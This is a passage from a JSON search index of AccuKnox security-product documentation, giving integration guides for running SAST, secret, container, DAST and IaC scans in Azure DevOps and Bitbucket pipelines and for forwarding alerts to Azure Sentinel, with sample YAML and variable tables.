Results in AccuKnox","text":"<ol> <li> <p>After the pipeline run, log in to AccuKnox.</p> </li> <li> <p>Go to Issues &gt; Findings and select Opengrep Findings. </p> </li> <li> <p>Inspect vulnerabilities, apply fixes, and create tracking tickets if necessary. </p> </li> </ol>"},{"location":"integrations/azure-sast/#conclusion","title":"Conclusion","text":"<p>Integrating SAST with Azure DevOps pipelines enables automated vulnerability detection and centralized security management. It ensures early detection of issues, risk assessment, and provides actionable insights to maintain code security and quality</p>"},{"location":"integrations/azure-secret-scan/","title":"Azure DevOps Secret Scan","text":"<p>This guide walks you through the process of integrating AccuKnox Secret Scanning into your Azure DevOps pipeline. By doing so, you can efficiently detect and handle hard-coded secrets within your codebase to improve the overall security posture of your applications.</p>"},{"location":"integrations/azure-secret-scan/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Access to an Azure DevOps project.</p> </li> <li> <p>An active AccuKnox account.</p> </li> <li> <p>A configured Azure DevOps agent for pipeline execution.</p> </li> </ul>"},{"location":"integrations/azure-secret-scan/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/azure-secret-scan/#step-1-install-accuknox-secret-scanning-extension","title":"Step 1: Install AccuKnox Secret Scanning Extension","text":"<ol> <li> <p>Visit the Azure DevOps Marketplace.</p> </li> <li> <p>Search for AccuKnox Secret Scanning and select Get it free to add to your Azure DevOps organization.     </p> </li> <li> <p>Choose your Azure organization and click Install.     </p> </li> <li> <p>Once installed, the AccuKnox Secret Scanning extension will be available in your pipeline.     </p> </li> </ol>"},{"location":"integrations/azure-secret-scan/#step-2-generate-an-accuknox-api-token","title":"Step 2: Generate an AccuKnox API Token","text":"<ol> <li> <p>Log in to the AccuKnox platform.</p> </li> <li> <p>Go to Settings &gt; Tokens and create a new token.</p> </li> <li> <p>Copy the token and save it for later use. For guidance on creating tokens, refer to Creating Tokens in AccuKnox.</p> </li> </ol>"},{"location":"integrations/azure-secret-scan/#step-3-set-up-variables-in-azure-devops","title":"Step 3: Set Up Variables in Azure DevOps","text":"<ol> <li> <p>Navigate to your Azure DevOps project.</p> </li> <li> <p>Go to Project Settings &gt; Pipelines &gt; Library and click + Variable Group.</p> </li> <li> <p>Add the following variables:</p> </li> </ol> Variable Description Default Value <code>results</code> Specifies which type(s) of results to output: <code>verified</code>, <code>unknown</code>, <code>unverified</code>, <code>filtered_unverified</code>. Defaults to all types. <code>\"\"</code> <code>branch</code> The branch to scan. Use <code>all-branches</code> to scan all branches. <code>\"\"</code> <code>excludePaths</code> Paths to exclude from the scan. <code>\"\"</code> <code>additionalArguments</code> Extra parameters for secret scanning. <code>\"\"</code> <code>inputSoftFail</code> Do not return an error code if secrets are found. <code>true</code> <code>accuknoxToken</code> The token for authenticating with the CSPM panel. N/A (Required) <code>accuknoxEndpoint</code> The URL of the CSPM panel to push the scan results to. N/A (Required) <code>accuknoxLabel</code> The label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/azure-secret-scan/#step-4-configure-pipeline-to-run-secret-scanning","title":"Step 4: Configure Pipeline to Run Secret Scanning","text":"<ol> <li> <p>Open or create your pipeline's YAML file in Azure DevOps.</p> </li> <li> <p>Add the following task to your pipeline's <code>steps</code> section:</p> </li> </ol> <pre><code>steps:-\n  task: accuknox-secret-scan@1.0.2\n  inputs:\n    accuknoxEndpoint: $(accuknoxEndpoint)\n    accuknoxToken: $(accuknoxToken)\n    accuknoxLabel: $(accuknoxLabel)\n    inputSoftFail: true\n</code></pre>"},{"location":"integrations/azure-secret-scan/#step-5-trigger-the-pipeline","title":"Step 5: Trigger the Pipeline","text":"<ul> <li> <p>Manually trigger the pipeline or push a code change to initiate the scanning process.</p> </li> <li> <p>Monitor the pipeline logs to ensure the AccuKnox Secret Scanning task executes successfully.</p> </li> </ul> <p></p>"},{"location":"integrations/azure-secret-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<ol> <li> <p>Once the pipeline finishes, log in to the AccuKnox SaaS dashboard.</p> </li> <li> <p>Navigate to Issues &gt; Findings, then select Secret Scan Findings.     </p> </li> <li> <p>Review the list of identified hardcoded secrets or sensitive data.     </p> </li> <li> <p>Address Findings, for each finding, create a task in your issue-tracking system, advising secret rotation and the use of a secure secret management solution. Once resolved, mark the issue as fixed in the AccuKnox platform.     </p> </li> </ol>"},{"location":"integrations/azure-secret-scan/#conclusion","title":"Conclusion","text":"<p>By integrating AccuKnox Secret Scanning into your Azure DevOps pipeline, you gain an essential layer of security to proactively detect and manage hardcoded secrets within your code. This integration helps safeguard your applications and ensures that your security practices stay strong throughout the development lifecycle.</p>"},{"location":"integrations/azure-sentinel-feeder-integration/","title":"Azure Sentinel Feeder Integration","text":""},{"location":"integrations/azure-sentinel-feeder-integration/#overview","title":"Overview","text":"<p>Azure Sentinel is a cloud-native SIEM solution by Microsoft that helps organizations detect, investigate, and respond to security threats. It collects data from various sources, applies AI and ML for intelligent analytics, and offers real-time insights. Key features include comprehensive data ingestion, threat detection with customizable rules, interactive investigation and hunting capabilities, automation through playbooks, and seamless integration with Microsoft and third-party security solutions. Azure Sentinel enables organizations to enhance security operations, improve threat detection and response, and protect their digital assets across hybrid and multi-cloud environments.</p>"},{"location":"integrations/azure-sentinel-feeder-integration/#prerequisites","title":"Prerequisites","text":"<ul> <li>Azure Logic App - Webhook</li> <li>Azure Sentinel Subscription</li> <li>Feeder Service Running on Client's cluster</li> </ul>"},{"location":"integrations/azure-sentinel-feeder-integration/#configuration","title":"Configuration","text":"<p>To forward the Alerts based on Policy Violation to Azure sentinel set the following environment variables <code>AZURE_SENTINEL_ENABLED</code> and <code>AZURE_SENTINEL_ALERTS_ENABLED</code> to true and to forward Logs <code>AZURE_SENTINEL_LOGS_ENABLED</code> to true in your Feeder Agent manifest.</p> <p>Also set the environment variables <code>AZURE_SENTINEL_GROUP_NAME</code>, <code>AZURE_SENTINEL_GROUP_VALUE</code>, <code>AZURE_SENTINEL_URL</code> of the Azure Logic App Deployed. To start editing the chart: <pre><code> kubectl edit configmap azuresentinel-vars -n accuknox-agents\n</code></pre> Edit the following Environment Variables mentioned below:</p> <pre><code>AZURE_SENTINEL_ALERTS_ENABLED: \"true\"\nAZURE_SENTINEL_ENABLED: \"true\"\nAZURE_SENTINEL_GROUP_NAME: \"Preferred Name\"\nAZURE_SENTINEL_GROUP_VALUE: \"Preffered Value\"\nAZURE_SENTINEL_LOGS_ENABLED: \"true\"\nAZURE_SENTINEL_URL: \"https://xyz.xxxxx.log ic.azu re.com:443/workflows/xxxxxxxx\"\n</code></pre>"},{"location":"integrations/azure-sentinel-feeder-integration/#environment-variables-for-azure-sentinel-integration","title":"Environment variables for Azure sentinel Integration","text":"<p>The following is the list of environment variables available for the Feeder-Service-Agent</p> Env Variable Description <code>AZURE_SENTINEL_ALERTS_ENABLED</code> Setting this to true forward the Policy Violated Alerts to Azure sentinel <code>AZURE_SENTINEL_ENABLED</code> Setting this to true forward the Logs and Alerts to Azure sentinel <code>AZURE_SENTINEL_GROUP_NAME</code> You can specify any group name based on your prefernece, this can be used to filter the events. This works as a key value pair, where key is Group <code>AZURE_SENTINEL_GROUP_VALUE</code> You can add any value to this group value. e.g., <code>Dev Team Cluster</code> <code>AZURE_SENTINEL_LOGS_ENABLED</code> Setting this to true forward the Logs to Azure sentinel <code>AZURE_SENTINEL_URL</code> Enter your Azure Logic App's Webhook URL here. e.g., <code>https://xyz.xxxxx.log ic.azu re.com:443/workflows/xxxxxxxx</code>"},{"location":"integrations/azure-sentinel-feeder-integration/#creating-webhook-using-the-azure-logic-app","title":"Creating webhook using the Azure Logic App","text":"<p>About the logic app: Azure Logic Apps is a cloud platform where you can create and run automated workflows with little to no code. Using the visual designer and selecting from prebuilt operations, you can quickly build a workflow that integrates and manages your apps, data, services, and systems. To create a webhook using the logic app.</p> <p>Step 1: Search for the logic app in the Azure portal.</p> <p>Step 2: Add the new logic app and fill in the relevant details.</p> <p>Step 3: After creating the logic it will appear in the logic app dashboard.</p> <p>Step 4: Open the app and click on the go-to resource button.</p> <p>Step 5: Select the http request to receive the logs.</p> <p>Step 6: Click on the new step and click HTTP after that click on the Azure log analytics to receive the alert data.</p> <p>Step 7: Add the connection name, workspaceID, and workspace key you can get workspace id and key in the log analytics workspace tab.</p> <p>Step 8: Click on the Integration and click on the Agents tab.</p> <p>Step 9: Click on the Azure log analytics data collector and click JSON request body as the body and log name, After the setup is done you will receive a webhook URL.</p> <p>Multiple options can be selected. Add label</p>"},{"location":"integrations/azure-sentinel/","title":"Azure Sentinel Integration","text":""},{"location":"integrations/azure-sentinel/#azure-sentinel-integration","title":"Azure Sentinel Integration","text":"<p>To forward the events to Azure Sentinel you must first set up the Azure Sentinel Integration.</p>"},{"location":"integrations/azure-sentinel/#integration-of-azure-sentinel","title":"Integration of Azure Sentinel:","text":""},{"location":"integrations/azure-sentinel/#a-prerequisites","title":"a. Prerequisites:","text":"<ul> <li>Azure Logic App - Webhook.</li> <li>Azure Sentinel Subscription.</li> </ul>"},{"location":"integrations/azure-sentinel/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Settings -\u2192 Integrations -\u2192 CWPP(Tab).</li> <li>Click integrate now on Azure Sentinel.</li> <li>Fill up the following fields:</li> <li> <p>Integration Name: Enter the name for the integration. You can set any name of your choice.    e.g., <code>Container Security Alerts</code></p> </li> <li> <p>Webhook URL: Enter your Azure Logic App's Webhook URL here.    e.g., <code>https://xyz.xxxxx.log ic.azu re.com:443/workflows/xxxxxxxx</code></p> </li> <li> <p>Group Name: You can specify any group name based on your prefernece, this can be used to filter the events. This works as a key value pair, where key is Group Name and Group Value is the value for the Key Group Name.     e.g., <code>K8s Cluster</code></p> </li> <li> <p>Group Value:  You can add any value to this group value.      e.g., <code>Dev Team Cluster</code></p> </li> <li>Click  Test  to check the new functionality, You will receive the test message on configured Azure Sentinel. -<code>Test message Please ignore !!</code></li> <li>Click Save to save the Integration. You can now configure Alert Triggers for Azure Sentinel Events</li> </ul>"},{"location":"integrations/azure-sentinel/#creating-webhook-using-the-azure-logic-app","title":"Creating webhook using the Azure Logic App","text":""},{"location":"integrations/azure-sentinel/#about-the-logic-app","title":"About the logic app:","text":"<p>Azure Logic Apps is a cloud platform where you can create and run automated workflows with little to no code. Using the visual designer and selecting from prebuilt operations, you can quickly build a workflow that integrates and manages your apps, data, services, and systems. To create a webhook using the logic app. - Step 1: Search for the logic app in the Azure portal.  - Step 2: Add the new logic app and fill in the relevant details. - Step 3: After creating the logic it will appear in the logic app dashboard.  - Step 4: Open the app and click on the go-to resource button. - Step 5: Select the http request to receive the logs. - Step 6: Click on the new step and click HTTP after that click on the Azure log analytics to receive the alert data. - Step 7: Add the connection name, workspaceID, and workspace key you can get workspace id and key in the log analytics workspace tab. - Step 8: Click on the Integration and click on the Agents tab.  - Step 9: Click on the Azure log analytics data collector and click JSON request body as the body and log name, After the setup is done you will receive a webhook URL. </p>"},{"location":"integrations/azure-sentinel/#to-see-logs-in-the-sentinel","title":"To see Logs in the Sentinel.","text":"<ul> <li>Step 1:  Open Microsoft Sentinel in the portal.</li> <li>Step 2:  Click on the integrations.</li> <li>Step 3:  Click on the logs tab and go to custom logs and select the time range and click on run the query to get the logs.</li> </ul>"},{"location":"integrations/azure-sqsast/","title":"Integrating SonarQube SAST with AccuKnox in Azure DevOps","text":"<p>This guide shows how to integrate SonarQube SAST scanning into an Azure DevOps Pipeline and automatically forward results to AccuKnox for analysis and mitigation.</p>"},{"location":"integrations/azure-sqsast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Azure DevOps Access: Access to your Azure DevOps project where the pipeline will be implemented.</p> </li> <li> <p>An active AccuKnox account.</p> </li> <li> <p>SonarQube Access: API tokens and project details for performing SAST scans.</p> </li> </ul>"},{"location":"integrations/azure-sqsast/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/azure-sqsast/#step-1-install-accuknox-sonarqube-sast-extension","title":"Step 1: Install AccuKnox SonarQube SAST Extension","text":"<ol> <li> <p>Visit the Azure DevOps Marketplace</p> </li> <li> <p>Search for AccuKnox SonarQube SAST and select Get it free to add to your Azure DevOps organization. </p> </li> <li> <p>Choose your Azure organization and click Install. </p> </li> <li> <p>Once installed, the AccuKnox SAST extension will be available in your pipeline. </p> </li> </ol>"},{"location":"integrations/azure-sqsast/#step-2-configure-azure-devops-pipeline-variables","title":"Step 2: Configure Azure DevOps Pipeline Variables","text":"<ol> <li> <p>Navigate to your Azure DevOps project.</p> </li> <li> <p>Go to Project Settings &gt; Pipelines &gt; Library and click + Variable Group.</p> </li> <li> <p>Add the following variables:</p> </li> </ol> Name Description accuknoxEndpoint The URL of the CSPM panel to push the scan results to (e.g., <code>cspm.demo.accuknox.com</code>). accuknoxToken Token for authenticating with the AccuKnox CSPM panel. Refer to How to Create Tokens. accuknoxLabel The label used to categorize and identify scan results in AccuKnox. Refer to How to Create Labels. sonarQubeUrl URL of the SonarQube server. sonarQubeToken User API token for SonarQube authentication. sonarQubeProjectKey SonarQube project key."},{"location":"integrations/azure-sqsast/#step-3-define-azure-devops-pipeline","title":"Step 3: Define Azure DevOps Pipeline","text":"<p>In your Azure repo, create/update your pipeline YAML (<code>azure-pipelines.yml</code>) and add the following task to your pipeline's steps section:</p> <pre><code>steps:-\n- task: accuknox-sq-sast@1\n  inputs:\n    sonarQubeUrl: 'https://sonarcloud.io'\n    sonarQubeToken: '$(sonarQubeToken)'\n    sonarQubeProjectKey: '&lt;sonarQubeProjectKey&gt;'\n    sonarQubeOrganizationId: '&lt;sonarQubeOrganizationId&gt;'\n    accuknoxEndpoint: '&lt;accuknoxEndpoint&gt;'\n    accuknoxToken: '$(accuknoxToken)'\n    accuknoxLabel: '&lt;accuknoxLabel&gt;'\n</code></pre>"},{"location":"integrations/azure-sqsast/#inputs-for-accuknox-sonarqube-sast-task","title":"Inputs for AccuKnox SonarQube SAST Task","text":"Input Value Required Default Value Description <code>sonarQubeUrl</code> Yes None URL of the SonarQube server. eg. <code>https://sonarqube.example.com</code> <code>sonarQubeToken</code> Yes None SonarQube user token. <code>sonarQubeProjectKey</code> Yes None Project key of your SonarQube project. <code>sonarQubeOrganizationId</code> No None Required only for SonarQube Cloud users <code>accuknoxEndpoint</code> Yes None AccuKnox domain for sending DAST report. eg. <code>cspm.demo.accuknox.com</code>, <code>cspm.accuknox.com</code> <code>accuknoxToken</code> Yes None AccuKnox API token. <code>accuknoxLabel</code> Yes None AccuKnox label to group similar findings together. <code>qualityGate</code> No <code>false</code> Quality gate check to fail the build if the quality gate fails. Value should be boolean. <code>skipSonarQubeScan</code> No <code>false</code> Skip SonarQube scan, for advanced users. Value should be boolean."},{"location":"integrations/azure-sqsast/#how-it-works","title":"How It Works","text":"<ol> <li> <p>SonarQube SAST Scan: The extension runs a SAST scan on the specified project using SonarQube.</p> </li> <li> <p>Generate Report: A report is generated based on the scan results.</p> </li> <li> <p>Upload to AccuKnox: The generated report is uploaded to AccuKnox SaaS for centralized monitoring and detailed analysis.</p> </li> <li> <p>Quality Gate Check: The pipeline checks if the project meets the quality standards defined in SonarQube.</p> </li> </ol> <p></p>"},{"location":"integrations/azure-sqsast/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<ol> <li> <p>After the pipeline run, log in to AccuKnox.</p> </li> <li> <p>Go to Issues &gt; Findings and select SAST Findings. </p> </li> <li> <p>Inspect vulnerabilities, apply fixes, and create tracking tickets if necessary. </p> </li> </ol>"},{"location":"integrations/azure-sqsast/#benefits-of-integration","title":"Benefits of Integration","text":"<ul> <li> <p>Centralized Monitoring: All vulnerabilities across projects are visible in the AccuKnox dashboard.</p> </li> <li> <p>Early Detection: Identify security issues early in the development lifecycle.</p> </li> <li> <p>Remediation Guidance: Leverage actionable remediation insights provided by AccuKnox.</p> </li> <li> <p>Seamless Integration: Easily integrates into Azure DevOps pipelines.</p> </li> </ul> <p>By using the AccuKnox SonarQube SAST Azure DevOps Extension, you can ensure secure code practices in your CI/CD pipelines while leveraging the power of centralized vulnerability management with AccuKnox.</p>"},{"location":"integrations/bitbucket-container-scan/","title":"Enhancing Docker Image Security in Bitbucket Pipelines","text":"<p>This guide demonstrates integrating AccuKnox into a Bitbucket pipeline to identify and remediate vulnerabilities in Docker images. Below, we compare the state of the pipeline before and after integrating AccuKnox, highlighting the security improvements.</p>"},{"location":"integrations/bitbucket-container-scan/#prerequisites","title":"Prerequisites","text":"<p>Before beginning, ensure the following:</p> <ul> <li> <p>A Bitbucket repository with Pipelines enabled.</p> </li> <li> <p>Access to AccuKnox</p> </li> </ul>"},{"location":"integrations/bitbucket-container-scan/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/bitbucket-container-scan/#step-1-generate-accuknox-api-token","title":"Step 1: Generate AccuKnox API Token","text":"<p>Log in to AccuKnox. Navigate to Settings and select Tokens to create an AccuKnox token to forward scan results to AccuKnox. For details on generating tokens, refer to How to Create Tokens.</p>"},{"location":"integrations/bitbucket-container-scan/#step-2-configure-bitbucket-pipeline-variables","title":"Step 2: Configure Bitbucket Pipeline Variables","text":"<ul> <li> <p>Navigate to your Bitbucket repository.</p> </li> <li> <p>Go to Repository Settings &gt; Repository Variables and click Add Variable. Refer to How to Create CI/CD Variables in Bitbucket.</p> </li> </ul> Name Description <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to (e.g., <code>cspm.demo.accuknox.com</code>) <code>ACCUKNOX_TENANT_ID</code> The ID of the tenant associated with the CSPM panel <code>ACCUKNOX_TOKEN</code> Token for authenticating with the AccuKnox CSPM panel <code>ACCUKNOX_LABEL</code> Label to categorize or tag the scan results <p>The label used to categorize and identify scan results in AccuKnox. Create a new label if it is not available</p>"},{"location":"integrations/bitbucket-container-scan/#step-3-define-the-bitbucket-pipelines-yaml-file","title":"Step 3: Define the Bitbucket Pipelines YAML File","text":"<p>Inputs for AccuKnox Container Scanning</p> Input Description Default Value <code>IMAGE_NAME</code> Docker image name. N/A (Required) <code>TAG</code> The tag for the Docker image. N/A (Required) <code>SEVERITY</code> Allows selection of severity level for the scan. Options: <code>UNKNOWN</code>, <code>LOW</code>, <code>MEDIUM</code>, <code>HIGH</code>, <code>CRITICAL</code>. <code>UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL</code> <code>SOFT_FAIL</code> Do not return an error code if there are failed checks. <code>true</code> <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel. N/A (Required) <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. N/A (Required) <code>ACCUKNOX_LABEL</code> The label created in AccuKnox SaaS for associating scan results. N/A (Required) <code>ACCUKNOX_TOKEN</code> The token for authenticating with the CSPM panel. N/A (Required) <p>Create or modify your <code>bitbucket-pipelines.yml</code> as follows:</p> <pre><code>pipelines:\n  branches:\n    main:\n    - step:\n        name: Set Variables and Scan\n        services:\n          - docker\n        script:\n          - export IMAGE_NAME=\"bitbucket\"\n          - export TAG=\"test\"\n          - docker build -t $IMAGE_NAME:$TAG .\n          - pipe: accu-knox/scan:2.0.0\n            variables:\n              SCAN_TYPE: CONTAINER\n              SOFT_FAIL: \"true\"\n              IMAGE_NAME: $IMAGE_NAME\n              TAG: $TAG\n              ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n              ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n              ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n              ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/bitbucket-container-scan/#after-accuknox-integration","title":"After AccuKnox Integration:","text":"<ul> <li> <p>Workflow Enhancements:</p> </li> <li> <p>The pipeline scans Docker images during the build process.</p> </li> <li> <p>Critical vulnerabilities halt the pipeline, ensuring only secure images are deployed.</p> </li> <li> <p>Outcome:</p> </li> <li> <p>Vulnerabilities are identified and remediated before the image reaches production.</p> </li> <li> <p>Secure images are pushed to the registry with confidence.</p> </li> </ul> <p></p>"},{"location":"integrations/bitbucket-container-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: Once the scan is complete, the user can go into the AccuKnox SaaS and navigate to Issues \u2192 RegistryScan, where they can find their repository name and select it to see the associated findings </p> <p>Step 2: After clicking on the image name, the user will see the metadata for the image that was built during the workflow execution. </p> <p>Step 3: In the <code>Findings</code> section, the user can see the image-specific vulnerabilities in a list manner that contains relevant information. These findings will also be available in the <code>Issues \u2192 Findings</code> section, where the user can manage these findings with others. </p> <p>Step 4: The <code>Resources</code> section contains information about packages and modules that were used to build the code base into a container image. </p> <p>Step 5: The user can see the scan history of every scan that happened while triggering the workflow. </p>"},{"location":"integrations/bitbucket-container-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox into Bitbucket pipelines improves Docker image security by detecting and mitigating vulnerabilities during the development lifecycle. This ensures that only secure images are deployed, reducing risks in production environments.</p>"},{"location":"integrations/bitbucket-container-variables/","title":"Bitbucket Container Scanning Variables","text":"<p>The container scanning section of the Bitbucket CI/CD pipeline is designed to integrate with AccuKnox to scan Docker images for security vulnerabilities.</p> <p>Here\u2019s the table that outlines the inputs and their descriptions, along with default values:</p> Input Value Description Default Value DOCKERFILE_CONTEXT The context of the Dockerfile to use for building the image. Dockerfile REPOSITORY_NAME The name of the Docker image repository. N/A (Required) TAG The tag for the Docker image. \"$CI_JOB_ID\" SEVERITY Allows selection of severity level for the scan. Options include UNKNOWN, LOW, MEDIUM, HIGH, CRITICAL. UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL INPUT_SOFT_FAIL Do not return an error code if there are failed checks. true ACCUKNOX_TOKEN The token for authenticating with the CSPM panel. N/A (Required) ACCUKNOX_TENANT The ID of the tenant associated with the CSPM panel. N/A (Required) ACCUKNOX_ENDPOINT The URL of the CSPM panel to push the scan results to. cspm.demo.accuknox.com ACCUKNOX_LABEL The label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/bitbucket-dast-variables/","title":"Bitbucket Dynamic Application Security Testing (DAST) Scanning Variables","text":"<p>The Dynamic Application Security Testing (DAST) scanning section of the Bitbucket CI/CD pipeline integrates with AccuKnox for scanning live web applications for security vulnerabilities.</p> <p>Here\u2019s the table that outlines the inputs and their descriptions, along with default values:</p> Input Description Default Value <code>TARGET_URL</code> The URL of the web application to scan. N/A (Required) <code>SEVERITY_THRESHOLD</code> The minimum severity level (e.g., High, Medium, Low, Informational) that will cause the pipeline to fail if present in the report. High <code>DAST_SCAN_TYPE</code> Type of ZAP scan to run: 'baseline' or 'full-scan'. baseline <code>INPUT_SOFT_FAIL</code> Do not return an error code if there are failed checks. true (boolean) <code>ACCUKNOX_TOKEN</code> The token for authenticating with the CSPM panel. N/A (Required) <code>ACCUKNOX_TENANT</code> ID of the tenant associated with the CSPM Panel panel. N/A (Required) <code>ACCUKNOX_ENDPOINT</code> URL of the CSPM panel to push the scan results to. cspm.demo.accuknox.com <code>ACCUKNOX_LABEL</code> Label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/bitbucket-dast/","title":"Integrating DAST in BitBucket CI/CD Pipeline","text":"<p>This guide demonstrates how to integrate AccuKnox and Dynamic Application Security Testing (DAST) into a Bitbucket pipeline to identify and resolve vulnerabilities in a web application. We also support Authenticated and MFA DAST, ensuring comprehensive security coverage for your applications. Below, we outline the process and outcomes.</p> <p></p>"},{"location":"integrations/bitbucket-dast/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>Access to Bitbucket Pipelines</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul> <p>Steps for Integration\u00b6</p> <p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Add the following variables in your Bitbucket repository settings: For details on configuring variables, refer to How to Create CI/CD Variables in Bitbucket.</p> <ol> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ol> <p>Step 3: Configure Bitbucket Pipeline</p> Input Description Default Value <code>TARGET_URL</code> The URL of the web application to scan. N/A (Required) <code>SEVERITY_THRESHOLD</code> The minimum severity level (e.g., High, Medium, Low) that will cause the pipeline to fail if present in the report. High <code>DAST_SCAN_TYPE</code> Type of ZAP scan to run: <code>'baseline'</code> or <code>'full-scan'</code>. baseline <code>SOFT_FAIL</code> Do not return an error code if there are failed checks. true (boolean) <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel. N/A (Required) <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. N/A (Required) <code>ACCUKNOX_LABEL</code> The label created in AccuKnox SaaS for associating scan results. N/A (Required) <code>ACCUKNOX_TOKEN</code> The token for authenticating with the CSPM panel. N/A (Required) <p>Use the following YAML configuration for your <code>bitbucket-pipelines.yml</code> file:</p> <pre><code>pipelines:\n  branches:\n    main:\n    - step:\n        name: AccuKnox DAST Scan\n        script:\n          - pipe: accu-knox/scan:2.0.0\n            variables:\n              SCAN_TYPE: DAST\n              TARGET_URL: \"http://testaspnet.vulnweb.com/login.aspx\"\n              SEVERITY_THRESHOLD: High\n              DAST_SCAN_TYPE: baseline\n              ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n              ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n              ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n              ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/bitbucket-dast/#initial-cicd-pipeline-without-accuknox-scan","title":"Initial CI/CD Pipeline Without AccuKnox Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox scan. When you push changes to the repository, no security checks are performed, potentially allowing security issues in the application.</p>"},{"location":"integrations/bitbucket-dast/#cicd-pipeline-after-accuknox-scan-integration","title":"CI/CD Pipeline After AccuKnox Scan Integration","text":"<p>After integrating AccuKnox into your CI/CD pipeline, the next push triggers the CI/CD pipeline. The AccuKnox scan identifies potential vulnerabilities in the application.</p> <p></p>"},{"location":"integrations/bitbucket-dast/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select DAST Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details.</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability</p> <p></p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue-tracking system to address the identified vulnerability.</p> <p></p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the CI/CD pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/bitbucket-dast/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox and DAST into Bitbucket pipelines enhances application security by identifying vulnerabilities early in the CI/CD process. This seamless integration ensures secure deployments and reduces risks in production environments.</p>"},{"location":"integrations/bitbucket-iac-scan/","title":"Enhancing IaC Security in Bitbucket Pipelines","text":"<p>This guide explains how to integrate Infrastructure as Code (IaC) security into a Bitbucket pipeline using AccuKnox. Automated checks will identify vulnerabilities in IaC templates, and results will be forwarded to AccuKnox for detailed analysis and remediation. This ensures your infrastructure adheres to security best practices, reducing deployment risks.</p>"},{"location":"integrations/bitbucket-iac-scan/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>Bitbucket Access</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ul>"},{"location":"integrations/bitbucket-iac-scan/#steps-for-integration","title":"Steps for Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Add the following variables in your Bitbucket repository settings:. For details on configuring variables, refer to How to Create CI/CD Variables in Bitbucket.</p> <ol> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ol> <p>Step 3: Configure Bitbucket Pipeline</p> Parameter Description Default Value <code>FILE</code> Specify a file for scanning (e.g., <code>.tf</code> for Terraform). Cannot be used with <code>DIRECTORY</code>. <code>\"\"</code> (empty, optional) <code>DIRECTORY</code> Directory with infrastructure code and/or package manager files to scan <code>\".\"</code> (current directory) <code>COMPACT</code> Do not display code blocks in the output <code>true</code> (boolean) <code>QUIET</code> Display only failed checks <code>true</code> (boolean) <code>FRAMEWORK</code> Run only on a specific infrastructure (e.g., Kubernetes or Terraform) <code>\"\"</code> (empty, optional) <code>SOFT_FAIL</code> Do not return an error code if there are failed checks <code>true</code> (boolean) <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel N/A (Required) <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to N/A (Required) <code>ACCUKNOX_LABEL</code> The label created in AccuKnox SaaS for associating scan results N/A (Required) <code>ACCUKNOX_TOKEN</code> The token for authenticating with the CSPM panel N/A (Required) <p>Use the following YAML configuration for your <code>bitbucket-pipelines.yml</code> 